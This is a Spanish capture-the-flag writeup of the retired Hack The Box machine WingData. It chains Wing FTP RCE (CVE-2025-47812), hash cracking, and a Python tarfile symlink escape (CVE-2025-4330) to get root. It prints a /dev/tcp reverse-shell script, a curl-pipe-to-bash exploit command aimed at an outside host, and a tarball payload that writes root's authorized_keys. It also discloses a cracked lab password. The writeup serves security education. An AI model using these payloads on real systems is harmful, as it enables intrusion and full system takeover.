

# Writeup: WingData (Hack The Box — Retirada)

WingData es una máquina **Fácil** que simula un entorno Linux con un servidor Wing FTP expuesto a través de un proxy inverso Apache en el puerto 80. El recorrido comienza con la explotación de una vulnerabilidad crítica en Wing FTP Server (CVE-2025-47812) que permite obtener una reverse shell como el usuario `wingftp`, seguido de la extracción de un hash de contraseña, cracking y escalada al usuario `wacky`. Finalmente, se abusa de un script Python que se ejecuta como root para explotar CVE-2025-4330 y obtener acceso total al sistema.

---

## Fase 1: Reconocimiento

Lanzamos un escaneo completo de puertos con Nmap:

```bash
sudo nmap -sS --min-rate 500 -p- -n -Pn -vv 10.129.44.96 -oG allPorts
```

El escaneo reveló dos puertos abiertos:

```bash
Discovered open port 80/tcp on 10.129.44.96
Discovered open port 22/tcp on 10.129.44.96
```

Realizamos un escaneo de servicios y versiones:

```bash
nmap -sVC -p 22,80 10.129.44.96 -oN targeted
```

**Resultado:**

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
80/tcp open  http    Apache httpd 2.4.66
|_http-title: WingData Solutions
|_http-server-header: Apache/2.4.66 (Debian)
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

El servidor web en el puerto 80 ejecuta Apache 2.4.66 y muestra un sitio con el título "WingData Solutions". Añadimos el dominio principal a `/etc/hosts`:

```bash
echo "10.129.44.96 wingdata.htb" >> /etc/hosts
```

---

## Fase 2: Enumeración Web

Al inspeccionar la página, descubrimos el subdominio **`ftp.wingdata.htb`**, que expone directamente el panel de administración del servidor FTP. Lo añadimos a `/etc/hosts`:

```bash
echo "10.129.44.96 ftp.wingdata.htb" >> /etc/hosts
```

Analizando el panel, identificamos que ejecuta la versión **7.4.3**, que es vulnerable a múltiples fallos críticos de seguridad.

---

## Fase 3: Explotación — Wing FTP Server (CVE-2025-47812)

La versión 7.4.3 de Wing FTP Server es vulnerable a **CVE-2025-47812**, una vulnerabilidad de Ejecución Remota de Código (RCE) con puntuación CVSS de **10.0**. Ocurre debido al manejo incorrecto de bytes nulos (`%00`) en el parámetro de inicio de sesión (`username`), permitiendo a un atacante sin autenticar inyectar código Lua malicioso y ejecutar comandos con privilegios del sistema.

### Encontrar un PoC

Buscamos un exploit público en GitHub:

```bash
git clone https://github.com/4m3rr0r/CVE-2025-47812-poc
```

### Preparar la reverse shell

Creamos un script `shell.sh` que nos devolverá una reverse shell:

```bash
cat > shell.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.10.17.44/443 0>&1
EOF
```

Montamos un servidor HTTP para servir el script:

```bash
python3 -m http.server 8000
```

### Ejecutar el exploit

```bash
python3 exploit.py -u http://ftp.wingdata.htb -c 'curl -s http://10.10.17.44:8000/shell.sh | bash'
```

**Salida:**

```bash
[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'curl -s http://10.10.17.44:8000/shell.sh | bash' and username: 'anonymous'
[+] UID extracted: 330394fa41c22ddcb93b2e5770d0d59cf528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: 330394fa41c22ddcb93b2e5770d0d59cf528764d624db129b32c21fbca0cb8d6
```

En nuestra máquina Kali, recibimos la conexión:

```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.17.44] from (UNKNOWN) [10.129.45.81] 58024
bash: cannot set terminal process group (3461): Inappropriate ioctl for device
bash: no job control in this shell
wingftp@wingdata:/opt/wftpserver$
```

Somos el usuario **`wingftp`**.

---

## Fase 4: Escalada a usuario `wacky`

Enumerando el sistema, encontramos archivos de configuración del Wing FTP Server que contienen hashes de contraseñas:

```bash
wingftp@wingdata:/opt/wftpserver$ ls Data/1/users/
anonymous.xml  john.xml  maria.xml  steve.xml  wacky.xml
```

Leemos el archivo del usuario `wacky`:

```bash
wingftp@wingdata:/opt/wftpserver$ cat Data/1/users/wacky.xml
```

```xml
<?xml version="1.0" ?>
<USER_ACCOUNTS Description="Wing FTP Server User Accounts">
    <USER>
        <UserName>wacky</UserName>
        <EnableAccount>1</EnableAccount>
        <EnablePassword>1</EnablePassword>
        <Password>2940defd3c3ef70a2dd44a53****************************************a</Password>
        <ProtocolType>63</ProtocolType>
        ...
```

Extraemos el hash y lo guardamos en `hash.txt`:

```bash
echo "32940defd3c3ef70a2dd44a53****************************************a:WingFTP" > hash.txt
```

### Crackeo del hash

El hash es de tipo **SHA256 (modo 1410)** con salt `WingFTP`. Usamos `hashcat` con `rockyou.txt`:

```bash
hashcat -a 0 -m 1410 hash.txt /usr/share/wordlists/rockyou.txt
```

El crackeo revela la contraseña:

```bash
wacky:!#7Blus******
```

### Acceso como `wacky`

```bash
ssh wacky@wingdata.htb
```

```bash
wacky@wingdata:~$ cat user.txt
[REDACTED]
```

Obtenemos la **flag de usuario**.

---

## Fase 5: Escalada a root — CVE-2025-4330

### Reconocimiento de permisos sudo

```bash
wacky@wingdata:~$ sudo -l
Matching Defaults entries for wacky on wingdata:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

El usuario puede ejecutar el script `restore_backup_clients.py` como **root** sin contraseña. El comodín `*` permite pasar argumentos.

### Estructura de directorios

```bash
wacky@wingdata:~$ ls -la /opt/backup_clients/
total 20
drwxr-x--- 4 root wacky 4096 Jan 12 08:43 .
drwxr-xr-x 4 root root  4096 Feb  9 08:19 ..
drwxrwx--- 2 root wacky 4096 Jan 12 08:32 backups
-rwxr-x--- 1 root wacky 2829 Jan 12 08:37 restore_backup_clients.py
drwxr-x--- 2 root wacky 4096 Jan 12 08:43 restored_backups
```

El directorio `backups/` es escribible por el grupo `wacky`, por lo que podemos colocar archivos allí.

### Análisis del script

El script `restore_backup_clients.py` realiza las siguientes acciones:

- Valida el nombre del backup con `^backup_\d+\.tar$`.
- Valida el directorio de restauración con `^restore_[a-zA-Z0-9_]{1,24}$`.
- Define `STAGING_BASE = "/opt/backup_clients/restored_backups"`.
- Utiliza `tarfile.open` y `extractall(path=staging_dir, filter='data')`.

### Identificación de la vulnerabilidad

El parámetro `filter='data'` fue introducido en Python 3.11.4 para prevenir extracciones inseguras. Sin embargo, **CVE-2025-4330** permite eludir esta protección mediante una estructura de enlaces simbólicos que provoca que `realpath` devuelva una ruta truncada al superar `PATH_MAX` (4096 bytes). El tarball malicioso puede entonces escribir archivos fuera del directorio de destino.

La versión de Python en el sistema es:

```bash
wacky@wingdata:/tmp$ python3 --version
Python 3.12.3
```

Esta versión es vulnerable a dicho CVE.

### Explotación

#### 1. Generar par de claves SSH

```bash
wacky@wingdata:/tmp$ ssh-keygen -t ed25519 -f /tmp/root_key -N ''
```

#### 2. Configurar el exploit PoC

Usamos el script público de **CVE-2025-4330** (autor: 0xDTC) y lo editamos con la configuración adecuada:

```python
# Directorio de extracción (debe coincidir con -r restore_test)
DEST_DIR = "/opt/backup_clients/restored_backups/restore_test/"

# Profundidad desde / hasta DEST_DIR: /opt (1) /backup_clients (2) /restored_backups (3) /restore_test (4)
DEPTH_TO_ROOT = 4

# Archivo a escribir en el sistema de destino
TARGET_FILE = "root/.ssh/authorized_keys"

# Contenido: clave pública del atacante
PAYLOAD = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... usuario@wingdata\n"

# Nombre del tarball (debe cumplir el formato backup_<número>.tar)
OUTPUT = "backup_99.tar"
```

#### 3. Generar el tarball malicioso

```bash
wacky@wingdata:/tmp$ python3 exploit.py
[*] Destination directory length: 50
[*] Component length: 238
[*] Estimated resolved path length: 4113
[*] PATH_MAX: 4096

[+] Created 16 directory/symlink pairs
[+] Created 254-char escaping symlink (target: ../../../../../../../../../../../../../../../../)
[+] Created 'escape' symlink (depth to root: 4)
[+] Added payload file: escape/root/.ssh/authorized_keys

[*] Created backup_99.tar
[*] Target file on extraction: /root/.ssh/authorized_keys
```

#### 4. Copiar el tarball al directorio de backups

```bash
wacky@wingdata:/tmp$ cp backup_99.tar /opt/backup_clients/backups/
```

#### 5. Ejecutar el script vulnerable

```bash
wacky@wingdata:/tmp$ sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_99.tar -r restore_test
[+] Backup: backup_99.tar
[+] Staging directory: /opt/backup_clients/restored_backups/restore_test
[+] Extraction completed in /opt/backup_clients/restored_backups/restore_test
```

El script se ejecuta como `root` y extrae el tarball. Debido a la vulnerabilidad, el filtro `filter='data'` es eludido y el archivo `authorized_keys` se escribe en `/root/.ssh/`.

#### 6. Conexión SSH como `root`

```bash
wacky@wingdata:/tmp$ ssh -i /tmp/root_key root@10.129.45.81
Linux wingdata 6.1.0-42-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.159-1 (2025-12-30) x86_64
...
Last login: Thu Jul 2 19:20:56 2026 from 10.129.45.81
root@wingdata:~# cat /root/root.txt
[REDACTED]
```

¡Obtenemos la **flag de root**!

---

## Conclusión

WingData es una máquina **Fácil** que combina:

1. **Explotación de CVE-2025-47812** en Wing FTP Server, expuesto a través de un proxy inverso Apache, para obtener una reverse shell como `wingftp`.
2. **Extracción de hashes** de los archivos de configuración del FTP.
3. **Crackeo del hash** para obtener credenciales del usuario `wacky`.
4. **Abuso de permisos sudo** para ejecutar un script Python como root.
5. **Explotación de CVE-2025-4330** en `tarfile` de Python para escribir la clave pública SSH en `/root/.ssh/authorized_keys`.
6. **Acceso root** y obtención de la flag.

---

## Lecciones aprendidas

## Lecciones aprendidas

1. **El software desactualizado es un vector de ataque crítico**  
   La versión 7.4.3 de Wing FTP Server contenía una vulnerabilidad crítica (CVE-2025-47812) que ya estaba parchada en versiones posteriores. Mantener las aplicaciones actualizadas con los últimos parches de seguridad es fundamental para reducir la superficie de ataque.

2. **Los proxies inversos no añaden seguridad por sí mismos**  
   Aunque el servicio se exponía a través de Apache, la aplicación subyacente seguía siendo vulnerable. La capa de proxy no mitiga fallos en el software; la seguridad debe implementarse en la aplicación y en su configuración.

3. **Las contraseñas débiles y comunes son un riesgo, incluso si se almacenan como hashes**  
   El hash de `wacky` fue crackeado porque la contraseña original (`!#7Blushing^*Bride5`) estaba en el diccionario `rockyou.txt`. Esto demuestra la importancia de usar contraseñas largas, complejas y no incluidas en listas comunes. Además, los archivos de configuración que contienen estos hashes deben tener permisos restrictivos (por ejemplo, `600`) y no ser legibles por usuarios no autorizados.

4. **Las protecciones en el código no sustituyen a tener las librerías actualizadas**  
   El script `restore_backup_clients.py` implementaba múltiples medidas de seguridad para prevenir escaladas de privilegios:
   
   - Validación estricta del nombre del backup (`backup_\d+\.tar`), impidiendo nombres arbitrarios.
   - Validación del directorio de restauración (`restore_[a-zA-Z0-9_]{1,24}`), limitando caracteres y longitud.
   - Verificación de que el archivo de backup exista en un directorio específico (`/opt/backup_clients/backups/`).
   - Uso de `filter='data'` en `tarfile.extractall()`, diseñado para prevenir extracciones inseguras.
   
   A pesar de todas estas validaciones, la vulnerabilidad **CVE-2025-4330** en el módulo `tarfile` permitió eludir el filtro `filter='data'` mediante una cadena de enlaces simbólicos que supera `PATH_MAX`. Esto demuestra que, por muy robustas que sean las validaciones a nivel de aplicación, **las librerías subyacentes también deben estar actualizadas y libres de vulnerabilidades conocidas**. Un solo fallo en una dependencia puede anular todas las protecciones implementadas en el código.

5. **Las vulnerabilidades en módulos estándar de Python pueden comprometer sistemas enteros**  
   El CVE-2025-4330 afecta a `tarfile`, un módulo ampliamente utilizado. Aunque Python 3.12.3 era relativamente reciente, esta vulnerabilidad demuestra que incluso las versiones modernas pueden contener fallos críticos. Es crucial mantener actualizado el intérprete y sus bibliotecas, y estar atento a los avisos de seguridad de la comunidad (CVEs, boletines oficiales, etc.), especialmente cuando se ejecutan scripts con privilegios elevados.
```
